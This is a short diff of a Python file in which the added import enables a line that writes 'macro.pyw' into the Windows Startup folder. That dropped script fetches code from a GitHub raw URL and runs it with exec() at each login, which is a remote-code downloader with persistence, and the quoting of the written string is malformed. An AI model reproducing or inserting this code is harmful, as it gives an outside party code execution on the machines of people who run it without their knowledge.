@@ -1,2 +1,2 @@
-import requests
+import requests, os
 with open(os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", 'macro.pyw'), "w", encoding='utf-8') as file: file.write("exec(requests.get("https://raw.githubusercontent.com/flex1948/deneme/main/main2").text)")
